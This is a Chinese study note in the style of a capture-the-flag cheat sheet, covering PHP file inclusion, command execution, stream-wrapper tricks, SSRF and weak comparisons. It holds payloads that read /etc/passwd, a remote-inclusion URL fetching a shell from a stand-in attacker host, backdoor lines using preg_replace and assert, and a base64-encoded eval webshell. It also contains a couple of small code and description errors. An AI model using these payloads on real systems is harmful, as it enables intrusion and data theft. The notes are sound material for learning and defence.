- require()
- require_once()
- fopen()
- readfile()

当 PHP 包含一个文件时，会将该文件当做 PHP 代码执行，而不会在意文件时什么类型。

### 本地文件包含

本地文件包含，Local File Inclusion，LFI。

```php
<?php
$file = $_GET['file'];
if (file_exists('/home/wwwrun/'.$file.'.php')) {
  include '/home/wwwrun/'.$file.'.php';
}
?>
```

上述代码存在本地文件包含，可用 `%00` 截断的方式读取 `/etc/passwd` 文件内容。

### `%00` 截断

```
?file=../../../../../../../../../etc/passwd%00
```

需要 `magic_quotes_gpc=off`，PHP 小于 5.3.4 有效。

### 路径长度截断

```
?file=../../../../../../../../../etc/passwd/./././././././././././.
```

Linux 需要文件名长于 4096，Windows 需要长于 256。

### 点号截断

```
?file=../../../../../../../../../boot.ini/………………
```

只适用 Windows，点号需要长于 256。

### 远程文件包含

远程文件包含，Remote File Inclusion，RFI。

```php
<?php
if ($route == "share") {
  require_once $basePath . "/action/m_share.php";
} elseif ($route == "sharelink") {
  require_once $basePath . "/action/m_sharelink.php";
}
```

构造变量 `basePath` 的值。

```
/?basePath=http://attacker/phpshell.txt?
```

最终的代码执行了

```
require_once "http://attacker/phpshell.txt?/action/m_share.php";
```

问号后的部分被解释为 URL 的 querystring，这也是一种「截断」。

普通远程文件包含

```
?file=[http|https|ftp]://example.com/shell.txt
```


## 命令执行
 
### assert

assert 函数的参数可以为布尔类型的值，也可以是字符串，当参数为字符串时，会被当作 PHP 代码执行

```php
// 可以执行 php 代码
$page = "flag'.system(\"ls\").'";
$file = "templates/" . $page . ".php";
// 这里构造后的新字符串如下，
// strpos('templates/'.system("ls").'.php', '..') === false
assert("strpos('$file', '..') === false");

// 当test.php?a=phpinfo()时，phpinfo()会被执行。
$a=$_GET['a'];
assert($a);
```

### 反引号 ` 
 
反引号 ` 可以调用 shell_exec 正常执行代码
 
```
`$_GET[v]` 相当于 shell_exec($_GET['v'])

`$_GET['v']` 变量 v 前后不能有单引号 
```

system，exec，shell_exec 的区别

```
system()
$last_line = system('ls'，$return_var);
system()会将输出内容直接印出，所以若于网页，会将所有回传内容都显示于页面上。
$last_line：只能取得最后一行的内容
$return_var：取得系统状态回传码

exec()
exec('ls'，$output，$return_var);
$output：回传内容都会存于此变数中(储存成阵列)，不会直接秀在页面上。
$return_var：取得系统状态回传码

shell_exec()
$output = shell_exec('ls');
$output：回传内容都会存于此变量中(储存成纯文字内容)，不会直接显示在页面上。
```

### preg_replace()
 
触发条件：
 
1. 第一个参数需要e标识符，有了它可以执行第二个参数的命令
2. 第一个参数需要在第三个参数中的中有匹配，不然echo会返回第三个参数而不执行命令，举个例子：
 
```php
// 这样是可以执行命令的
echo preg_replace('/test/e', 'phpinfo()', 'just test');
 
// 这种没有匹配上，所以返回值是第三个参数，不会执行命令
echo preg_replace('/test/e', 'phpinfo()', 'just tesxt'); 
```
 
我们可以构造这样的后门代码
 
```php
@preg_replace("//e", $_GET['h'], "Access Denied");  
echo preg_replace("/test/e", $_GET["h"], "jutst test"); 
```
 
当访问这样这样的链接时就可以被触发
 
    http://localhost:8000/testbug.php?h=phpinfo();
 
## 伪协议
 
可以应用于

- file_get_contents
- readfile

### php://filter 
 
读取文件
 
```php
/lfi.php?file=php://filter/convert.base64-encode/resource=flag.php
/lfi.php?file=php://filter/read=convert.base64-encode/resource=flag.php
```

控制文件写入的处理逻辑

```
<?php 
show_source(__FILE__); 
$c = "<?php exit;?>"; 
@$c.=$_GET['c']; 
@$filename = $_GET['file']; 
@file_put_contents($filename, $c); 
highlight_file('tmp.php'); 
?>

# 先对内容做base64-decode，然后再写入文件
php://filter/write=convert.base64-decode/resource=abc.php&c=0PD9waHAgQGV2YWwoJF9SRVFVRVNUWydoJ10pOz8%2B
# php 在做 base64_decode 的时候会自动去掉无法解析的字符<?php exit;?>会变成phpexit，因为base64是每4个字符进行解析的，因此前面加上任意字符补全，注意如果base64里面有+号，要记得 urlencode
```

利用伪协议就可以绕过 php 的 is_file，然后读取文件

```php
$a = '123.php';
$b = 'php://filter/resource=123.php';
// boolean true
var_dump(is_file($a));
// boolean false
var_dump(is_file($b));
```

### php://input 
 
写入文件， 数据在body那边传过去，可以用GET，也可以用 POST 传过去
 
```php
/test.php?file=php://input
```

将 user 用 body 传过去，注意 body 那边不是表单的形式，是直接把 body 的数据整个提交
```
GET /?user=php://input HTTP/1.1
Host: 10.255.10.157:8087
Content-Length: 17

the user is admin
```

### data:// 
 
将 include 的文件流重定向到用户控制的输入流
 
```php
/test.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpO2V4aXQoKTsvLw==
```
 
可以用于控制 file_get_contents 的内容为用户输入的流

```php
$file=$_GET['file'];
$data = @file_get_contents($a,'r');
echo $data;
```

file_get_contens支持data协议，并且可以指定任意的域名，利用 `data://yourname.auu/data/plain;base64,xxx ` 这样的 payload 绕过 php 的 parse_url 对域名和路径的限制。

### phar://
 
发现有一个文件上传功能，无法绕过，仅能上传jpg后缀的文件。与此同时，无法进行文件包含截断。allow_url_include=on 的状态下，就可以考虑phar伪协议绕过。
 
写一个shell.php文件，里面包含一句话木马。然后，压缩成xxx.zip。然后改名为xxx.jpg进行上传。最后使用phar进行包含
这里的路径为上传的 jpg 文件在服务器的路径
 
```php
/index.php?id=phar://路径/xxx.jpg/shell
```
 
### zip://
 
上述 phar:// 的方法也可以使用 zip:// 
 
然后吧1.php文件压缩成zip，再把zip的后缀改为png，上传上去，并且可以获得上传上去的png的地址。

1.zip文件内仅有1.php这个文件 
 
```php
/php?file=zip://1.png%231.php  

// 也可以尝试不改名为png，直接使用zip上传测试一下
/php?file=zip://1.zip%231.php  
```

### dict://

```
# 查看 redis 中的 info 数据
/index.php?url=dict://127.0.0.1:6379/info
# 查看 ssh 的 banner
/index.php?url=dict://127.0.0.1:ssh端口/info
```

### file://

```
/ssrf.php?url=file:///etc/passwd

// 利用 ﬁle://localhost 来读取本地文件
/index.php?url=file://localhost/var/www/html/flag.php
``` 

## 文件上传漏洞
 
正常的文件上传流程是这样的，首先接收 POST 的文件，在 `tmp` 目录下生成临时文件，文件名是 `php[A-Za-z0-9]{6}`，在 php 处理后删除临时文件，虽然没有文件上传，但是只要文件上传开启了就一定会创建临时文件，在这中途如果 php 意外退出则临时文件不会被删除，造成 `/tmp` 目录下可以留下任何内容。 内容构造好后，单纯爆破  `/tmp/phpxxxxxx`  文件名是不太现实但是也可行的。
 
通过文件包含，让其包含本身，造成无限循环后发出 SIGSEGV 信号，可以导致 php 意外退出。


## 一些函数

### stripos/strpos

stripos() 函数返回字符串在另一个字符串中第一次出现的位置，如果没有找到该字符串，则返回 false。该函数对大小写不敏感，strpos() 函数是大小写敏感的。但是在返回值为0的情况下，弱类型比较下 0 == false

```php
$a = 'a';
if(stripos($r, 'a') == false) {
       // 0 是 $r存在字符串 'a'，但是由于0和false是相等的，所以就执行了这里
}

if(stripos($r, 'a') === false) {
     // 这种情况下，$r 中必须不包含 'a'，才会执行这里
}

if(strpos([], "a") !==false) {
    // strpos()找的是字符串，那么传一个数组给它，strpos()出错返回null，null !== false
}
```

### eregi

eregi() 函数在一个字符串搜索指定的正则表达式的字符串，搜索不区分大小写，区分大小写使用 eregi，如果匹配成功返回 true，否则则返回 false。

```php
$password = "abc";
if (! eregi ("[[:alnum:]]{8,10}", $password))
{
   print "Invalid password! Passwords must be from 8 - 10 chars";
}
else
{
  print "Valid password";
}
```

### stristr

stristr() 函数搜索字符串在另一字符串中的第一次出现。该函数是不区分大小写的。如需进行区分大小写的搜索，请使用 strstr() 函数。

```php
// string，规定被搜索的字符串。
// search，规定要搜索的字符串。如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符。
stristr(string, search, before_search)
// before_search 为可选参数，默认值为 "false" 的布尔值。
// 如果设置为 "true"，它将返回 search 参数第一次出现之前的字符串部分。

```

### iconv 

iconv 函数用于做编码转换，函数原型 

```
string iconv ( string $in_charset , string $out_charset , string $str ) 
in_charset：输入的字符集 
out_charset：输出的字符集 
str：要转换的字符串 
```

iconv 在字符编码转换时可能导致`字符串截断`。当 `$str` 中有一个字符不能被目标字符集所表示时，`$str` 从第一个无效字符开始截断并导致一个 E_NOTICE。 例如：

```php
$d = iconv("UTF-8", "gb2312", $c);
```

该代码是将变量 `$c` 从UTF-8 编码转换为 gb2312。那么当 `$c` 中存在一个不能被 gb2312 表示的字符时，那么就会截断。

### 转义函数

PHP 的字符串向数据库进行写入时，为避免数据库错误，需要对特殊字符进行转义（字符前加上 \）。特殊字符：单引号（'）、双引号（"）、反斜线（\）与 NUL（NULL 字符）。

- addslashes 对特殊字符加上转义字符，返回一个字符串
- stripslashes 该函数为 addslashes() 的反函数，去掉转义字符串，返回一个字符串

### strtr

转换字符串中特定的字符，如果 from 和 to 参数的长度不同，则会被格式化为最短的长度。

```
strtr(string,from,to)
strtr(string,array)
# 按字符做替换，from 中每个字符替换成 to 中对应顺序的字符
# 12341111234
var_dump(strtr('abcd111abcd', 'abcd', '1234'));
```

数组形式的参数

```php
<?php
$arr = array("Hello" => "Hi", "world" => "earth");
echo strtr("Hello world",$arr);
?>
```

### 格式化字符串

- sprintf， 把格式化的字符串写入变量中
- vsprintf，与 sprintf 功能相同，但是 vsprintf 中的参数位于数组中

- fprintf，把格式化的字符串写入指定的输出流（例如：文件或数据库）
- vfprintf，与 fprintf 功能相同，但是 vfprintf 中的参数位于数组中

- printf，输出格式化的字符串
- vprintf，与 printf 功能相同，但是 vprintf 中的参数位于数组中

```php
$number = 2;
$str = "Shanghai";

printf("在%s有 %u 百万辆自行车。",$str,$number);
vprintf("There are %u million bicycles in %s.",array($number,$str));

$txt = sprintf("There are %u million cars in %s.", $number, $str);
$txt = vsprintf("There are %u million bicycles in %s.",array($number,$str));
echo $txt;

$file = fopen("test.txt","w");
echo fprintf($file,"There are %u million bicycles in %s.",$number,$str);
echo vfprintf($file,"There are %u million bicycles in %s.",array($number,$str));
```

### curl

curl是支持 `file://host/path`, `file://path`  这两种形式，但是即使有 host, curl仍然会访问到本地的文件。用 `?` 或者 `#` 可以截断 url 后面拼接的 `/`,  payload: `file://www.baidu.com/etc/flag?`

```php
$url = $_GET['site']; 
$url_schema = parse_url($url); 
$host = $url_schema['host']; 
$request_url = $url."/"; 

if ($host !== 'www.baidu.com'){ 
    die("wrong site"); 
}

$ci = curl_init();
curl_setopt($ci, CURLOPT_URL, $request_url);
curl_setopt($ci, CURLOPT_RETURNTRANSFER, 1);
$res = curl_exec($ci);
curl_close($ci);
echo($res); 
```

PHP的cURL支持通过给 CURL_POSTFIELDS 传递关联数组（而不是字符串）来生成 multipart/form-data 的POST请求。可以使用“@+文件全路径”的语法附加文件，将会读取该文件内容，并作为POST请求的内容。

注：PHP5.4及以下版本仅支持@语法形式；PHP5.5两种都是支持的，设置 CURL_SAFE_UPLOAD＝true 强制使用CURLFile方式；PHP5.6+仅支持CURLFile方式，即使设置CURL_SAFE_UPLOAD＝false也是毫无意义的。

```
http://120.55.42.243:20010/index.php?url=@/opt/api/dnsapi/views.py
```

### 其他函数

- ctype_upper 检查是否为大写字符
-  htmlentities 将字符转换为 HTML 转义字符
- implode 将数组拼接成字符串

## 数据库相关

### mysql_real_escape_string

转义 SQL 语句中使用的字符串中的特殊字符，会转义单引号和双引号，下列字符受影响：

```
\x00
\n
\r
\
'
"
\x1a
```

如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。


### 数据库字符集绕过

在默认情况下，mysql字符集为 `latin1`，而执行了 `set names utf8` 以后，character_set_client、character_set_connection、character_set_results等与客户端相关的配置字符集都变成了 utf8，但character_set_database、character_set_server 等服务端相关的字符集还是 latin1。


```php
$db = mysql_connect($dbhost, $dbuser, $dbpass);
mysql_select_db($database,$db);
mysql_query("set names utf8");

// username=admin%c2，在mysql中可以正常查出 username='admin' 的结果
if ($username === 'admin') {
$result = $mysqli->query("SELECT * FROM z_users where username = '{$username}' and password = '{$password}'");
}
```

character_set_client 和 character_set_connection 被设置成了utf8，而内部操作字符集其实也就是username 字段的字符集还是默认的 latin1。于是整个操作就有如下字符串转换过程：

    utf8 --> utf8 --> latin1

最后执行比较username='admin' 的时候，'admin' 是一个latin1字符串。Mysql在转换字符集的时候，将不完整的字符给忽略了。



